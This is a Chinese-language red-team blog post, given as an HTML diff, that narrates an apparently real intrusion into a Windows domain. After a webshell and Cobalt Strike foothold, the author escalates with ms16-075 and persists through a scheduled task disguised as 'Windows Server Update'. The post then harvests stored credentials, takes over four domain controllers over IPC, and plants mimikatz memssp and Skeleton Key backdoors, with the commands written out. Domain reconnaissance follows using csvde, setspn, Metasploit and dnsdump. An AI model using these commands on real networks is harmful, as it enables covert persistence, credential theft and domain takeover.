@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="saulGoodman">
+
+
+
+
+
+<title>一次小型 APT 内网域渗透 | 渗透攻击红队-专注于渗透红队攻击</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">saulGoodman</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">saulGoodman</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">一次小型 APT 内网域渗透</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">saulGoodman</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">July 4, 2021&nbsp;&nbsp;21:35:48</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/redTeam/">redTeam</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <blockquote>
+<p>在内网渗透中拿到了域控就结束了吗？但实际上内网渗透中拿到域控才刚开始！如果是做 APT 需要对某个目标、某个部门、某个部门中的某个人进行渗透，这个时候就需要长时间去了解这个内网环境，对域内进行定向打击，需要花很长时间去熟悉一个内网框架的！所以说内网渗透的本质其实就是信息搜集。</p>
+</blockquote>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>首先是拿到了一个 <code>webshell</code>，目标当前机器无 <code>AV</code> ，然后上 <code>powershell</code> 弹到了 <code>CobaltStrike</code>：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/dSVxoo.png"><br>通过信息搜集发现是有域环境的：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/hmqFjS.png"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/UtzF9C.png"></p>
+<h2 id="令牌窃取拿到域控"><a href="#令牌窃取拿到域控" class="headerlink" title="令牌窃取拿到域控"></a>令牌窃取拿到域控</h2><p>在域渗透中有很多方式能够快速拿到域控，在本篇就写如何令牌窃取快速拿域控权限，以后有机会在写其他手段！<br>查询域管理员有两个用户：<code>x10</code> 、<code>Administrator</code>:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group <span class="string">&quot;domain admins&quot;</span> /domain</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/CmIqfP.png"><br>查询域控制器发现有多台：<code>xxxxx-PDM$</code>  、<code>xxxxx-SERVER$</code> 、<code>xxx-DC$</code>、 <code>xx-SERVER$</code>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">net group <span class="string">&quot;domain controllers&quot;</span> /domain</span><br><span class="line">```    </span><br><span class="line">![](https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/CJbbHM.png)</span><br><span class="line">`ping` 域控的主机名分别得到了他们的 `IP`：</span><br><span class="line">```bash</span><br><span class="line">xxxxx-PDM	192.168.2.105</span><br><span class="line">xxxxx-SERVER	192.168.2.106</span><br><span class="line">xxx-DC	192.168.2.107</span><br><span class="line">xx-SERVER	192.168.2.104</span><br></pre></td></tr></table></figure>
+<p>随后通过 <code>ms16-075</code> 提权到 <code>SYSTEM</code>：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/X5sAse.png"><br>然后做了一个定时任务保持权限不丢失 ：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell  schtasks /create /RL HIGHEST /F /tn <span class="string">&quot;Windows Server Update&quot;</span> /tr <span class="string">&quot;c:\windows\Temp\Cha\64.exe&quot;</span> /sc DAILY /mo 1 /ST 09:00 /RU SYSTEM</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/GXfWLf.png"><br>一般拿到一台机器的权限后立即做好权限维持，还有就是马上把当前机器里的各种文件、浏览器数据翻个底朝天（除了那些可能保存在浏览器中的账号密码，还有那些像浏览器收藏夹及历史记录里的一些内网铭感资产的链接也会对我们有所帮助）<br>通过把当前机器文件翻遍后找到了一些账号密码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Mssql：</span><br><span class="line">User ID=sa;Password=xxxxxxx</span><br><span class="line"></span><br><span class="line">门禁：</span><br><span class="line">user：admin，pass：xxxxxxxx</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/Vc1nJP.png"><br>还可以通过 <code>GPP</code>、查看核心机器共享文件里面有什么，这里主要是域控：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/YUuIXv.png"><br>可以看到共享组策略目录中其实包含里很多东西，一些域管理员可能会利用它对域内用户登陆时进行一些初始化操作，所以我们在域渗透的过程中首先都会去看看这个地方，看看有没有什么敏感信息文件：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/y9EyO8.png"><br>但是在本机器上没有翻到有价值的共享文件！之后通过查看当前机器有域管进程：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/SOTfIn.png"><br>随即注入进程让域管上线：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/VM35Nx.png"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/z30GmA.png"><br>域管和域控建立 <code>IPC</code> ：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.2.105</span><br><span class="line">net use \\192.168.2.106</span><br><span class="line">net use \\192.168.2.107</span><br><span class="line">net use \\192.168.2.104</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/1cVG8I.png"><br>直接拿到四个域控：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shell dir \\192.168.2.105\c$</span><br><span class="line">shell dir \\192.168.2.106\c$</span><br><span class="line">shell dir \\192.168.2.107\c$</span><br><span class="line">shell dir \\192.168.2.104\c$</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/ikgl0f.png"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/EO66Rt.png"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/N25UUo.png"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/KtgM39.png"><br>通过扫描内网存活：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/4XTv9K.png"><br>然后通过中转让域控上线把：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/Vx6Qc1.png"><br>成功拿到域控：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/WkLC3Y.png"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/6IiBAE.png"><br>这域基本上已经死了。</p>
+<h2 id="域控权限维持"><a href="#域控权限维持" class="headerlink" title="域控权限维持"></a>域控权限维持</h2><p>为了能够长时间控制到当前域控，我留下了两个后门：<code>SSP</code>、<code>Skeleton Key</code> 。</p>
+<h3 id="SSP-记录登陆到当前机器的所有账号密码"><a href="#SSP-记录登陆到当前机器的所有账号密码" class="headerlink" title="SSP 记录登陆到当前机器的所有账号密码"></a>SSP 记录登陆到当前机器的所有账号密码</h3><p><code>SSP</code> 即 <code>Security Support Provider</code>，通俗理解就是一个用于身份验证的 <code>dll</code> , 系统在启动时 <code>SSP</code> 会被加载到 <code>lsass.exe</code> 进程中 , 由于 <code>lsa</code> 可扩展 , 导致在系统启动时我们完全可以加载一个自定义的 <code>dll</code> , 比如 , 一个用于记录所有登录到当前系统的明文账号密码的 <code>dll</code>。<br>通过拿到域控，我留了一个 <code>SSP</code> 后门：目标无需重启，立即记录密码信息，如果当前机器重启则失效！直接注入 <code>ssp</code>，因为当前机器无杀软，实际情况下需要注意杀软情况：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; mimikatz privilege::debug</span><br><span class="line">beacon&gt; mimikatz misc::memssp</span><br><span class="line">beacon&gt; shell <span class="built_in">type</span> C:\Windows\System32\mimilsa.log</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/fgT5eL.png"><br>等待了许久终于有人登陆当前机器成功获取到了密码：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/4vAvAX.png"></p>
+<h3 id="Skeleton-Key-万能密码后门"><a href="#Skeleton-Key-万能密码后门" class="headerlink" title="Skeleton Key - 万能密码后门"></a>Skeleton Key - 万能密码后门</h3><p>为了防止域控权限丢失，我还留下了一个 <code>Skeleton Key</code> 后门，这个也不算后门，只能算一个<code>万能密码</code>，原理就是通过在 <code>lsass</code> 进程中创建了一个万能密码，通过这个万能密码我们可以随时访问到当前域控！<br>通过 <code>mimikatz</code> 在域控制器上安装 <code>Skeleton Key</code>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; mimikatz privilege::debug</span><br><span class="line">beacon&gt; mimikatz misc::skeleton</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/B9Oajc.png"><br>安装成功后我们可以通过其他域内主机的普通域用户，使用万能账号域管用户：<code>a-xxxxx\administrator</code> 密码 <code>mimikatz</code> 利用 <code>IPC</code> 连接域控：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell net use \\xxxxx-PDM\c$ /user:<span class="string">&quot;a-xxxxx\administrator&quot;</span> <span class="string">&quot;mimikatz&quot;</span></span><br><span class="line">beacon&gt; shell dir \\xxxxx-PDM\c$</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/WhXbI9.png"></p>
+<h2 id="域内信息搜集整理"><a href="#域内信息搜集整理" class="headerlink" title="域内信息搜集整理"></a>域内信息搜集整理</h2><p>为了能够梳理当前域内的信息，我使用的是 <code>BloodHound</code> 分析当前域环境的各个关系！<br>先下载：<a href="Neo4j">https://neo4j.com/artifact.php?name=neo4j-community-3.4.4-windows.zip</a><br>在 <code>cmd</code> 下输入命令 <code>neo4j.bat console</code> 启动 <code>Neo4j</code> 服务：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/R3VVMa.png"><br>这个时候访问本地 <code>web</code>：<code>http://127.0.0.1:7474/browser/</code>  ，默认账号密码为：<code>neo4j</code>（然后会让你修改一次密码）<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/2PknpV.png"><br>之后安装 <code>Bloodhound</code> ：<a href="Bloodhound">https://github.com/BloodHoundAD/BloodHound/releases/download/1.5.2/BloodHound-win32-x64.zip</a><br>下载完成后解压，进入目录找到 <code>BloodHound</code> 并运行：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/CPkCZW.png"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/Gg08GR.png"><br>现在已经完成了安装！之后需要通过 <code>SharpHound.exe</code> 提权域内所有信息：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/2E3Hgq.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell C:\Windows\Temp\BloodHound.exe -c all</span><br></pre></td></tr></table></figure>
+<p>在这期间它会进行大量的 <code>ldap</code> 查询域内数据，等运行完后会在当前目录下生成一个 <code>当前时间_BloodHound.zip</code> 的文件！但是发现出问题了，一直不能运行：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/KjFKTK.png"><br>通过分析才知道 <code>2012</code> 版本可以用这个，因为 <code>.net</code> 版本有问题.<br>没事，我们换种方法，通过 <code>csvde</code> 也能帮我们梳理域内信息，具体用法：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">csvde -setspn [域的名字] -f [文件名].csv</span><br><span class="line">csvde -setspn A-xxxxx -f c:\windows\temp\domain.csv</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/jDqBlk.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">LDAP的存储规则：一般存储的是域的信息</span><br><span class="line">区分名（DN，Distinguished Name）一个条目的区分名称叫做“dn”或者叫做区分名。在一个目录中这个名称总是唯一的。</span><br><span class="line">CN=Common Nmae 为用户名或服务器名，最长可以到80个字符，可以为中文。</span><br><span class="line">OU=Organization Unit为组织单元，最多可以有四级，没级最长32个字符，可以为中文。</span><br><span class="line">O=Organization为组织名，可以3-64个字符长度。</span><br><span class="line">C=Country为国家名，可选，为2个字符长度。</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/YMgKHi.png"><br>还可以通过 <code>spn</code> 查询域内详细信息：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">查看当前域内所有的SPN： setspn  -Q  */*</span><br><span class="line">查看指定域 test.com 注册的SPN：setspn -T [域的名字] -Q */*</span><br><span class="line"></span><br><span class="line">setspn -T A-xxxxx -Q */*  &gt; c:\windows\temp\domain.txt</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/aJ5RxO.png"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/zype63.png"><br>之所以要获取目标域的完整 <code>spn</code> 记录，核心就是为了摸清目标域内所有敏感机器资产的具体分布情况，这样方便我们后续单独对这些机器进行逐个“重点突破”，我们还可以拿着这些获取到的机器名，来快速完整探测当前域内的所有存活主机！<br>第一种方法当然也可以通过 <code>nbtscan</code> 来快速发现内网机器存活，通过 <code>nbtscan</code> 跑出来的结果发现机器名和域名能够帮我们快速识别哪些机器可能是在域内，哪些机器是我们后期要重点关照的：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/qiJidN.png"><br>第二种方式可以通过 <code>Metasploit</code> + <code>cs</code> 的 <code>socks</code> 来帮我探测内网主机存活是否存在域还是工作组以及是什么系统，关于 <code>Metasploit</code> 的使用我之前也发过相关文章到公众号，这个就不再多阐述：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use auxiliary/scanner/smb/smb_version</span><br><span class="line">msf6 &gt; <span class="built_in">set</span> rhosts 192.168.2.0/24</span><br><span class="line">msf6 &gt; <span class="built_in">set</span> threads 16（实际上根据情况，可以把线程调小点，因为我现在是凌晨，所以调到了最大）</span><br><span class="line">msf6 &gt; run</span><br><span class="line">msf6 &gt; services</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/Xbvvq4.png"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/wnkgOT.png"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/4XintF.png"><br>从上图可以看到，大部分系统都是 <code>XP</code> 这说明可以利用永恒之蓝，当然这都是后话了！<br>第三种方式可以通过 <code>dnsdump</code> 快速根据域内机器名获取到对应的 <code>IP</code> 是多少！<br><code>dnsdump</code> 下载地址是：<a href="dnsdump">https://github.com/dirkjanm/adidnsdump</a><br>大家可以根据实际情况可以把 <code>py</code> 文件打包成 <code>exe</code> 或者可以直接通过 <code>proxychains</code> + <code>socks</code> 也能运行！我这里就直接在当前机器运行 <code>exe</code>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dnsdump.exe -u 域名\域用户 -p 域密码  域控制器名 -r </span><br><span class="line"></span><br><span class="line">C:\Windows\temp\dnsdump.exe -u A-xxxxx\administrator -p password xxxxx-PDM -r</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/pcEVbm.png"><br>然后就会在当前路径下生成一个文件：<code>records.csv</code>:<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/4iP92m.png"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/N4XxKF.png"><br>这个时候对应的<code>机器名</code>的对应 <code>IP</code> 就一目了然了！<br>当然还要去看看当前机器有哪些网段，<code>ipconfig /all</code> 是看不出到底还有哪些网段可以访问的，这个时候我们可以看看<code>路由</code>，分析<code>子网掩码</code>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">route <span class="built_in">print</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/Pbzy8q.png"><br>还可以通过查看网络连接看看有没有和其他 <code>IP</code> 进行链接：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/c7PTFg.png"><br>这台机器很显然就只有 <code>192</code> 这个段！</p>
+<h2 id="域内定向打击"><a href="#域内定向打击" class="headerlink" title="域内定向打击"></a>域内定向打击</h2><p>到这里内网渗透其实本质上已经结束了，但是实际上内网渗透拿到域控才刚开始，如果是做 <code>APT</code> 需要对某个区、某个部门、某个人的电脑进行渗透，这个时候就需要长时间去了解这个内网环境，找到你要攻击的人的主机/服务器对应在内网的那个<code>IP</code>，这是需要花很长时间去搜集信息的，所以说内网渗透的核心其实就是信息搜集！<br>实际上内网渗透这才刚开始，接下来对域内某台主机进行定向攻击渗透，会用到各种手段！<br>未完待续。。。</p>
+<h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><strong>若有好的建议和合作可以通过公众号与我联系！</strong><br>微信公众号：<code>渗透攻击红队</code><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/logo/vxgzh.jpeg"></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>saulGoodman</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://example.com/2021/07/04/apt-redteam-1/">http://example.com/2021/07/04/apt-redteam-1/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/redTeam/"># redTeam</a>
+                    
+                        <a href="/tags/APT/"># APT</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2021/07/01/dumping-rdp-credentials/">内网渗透中当 RDP 凭证没勾选保存，如何获取到明文凭证信息？</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© saulGoodman | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
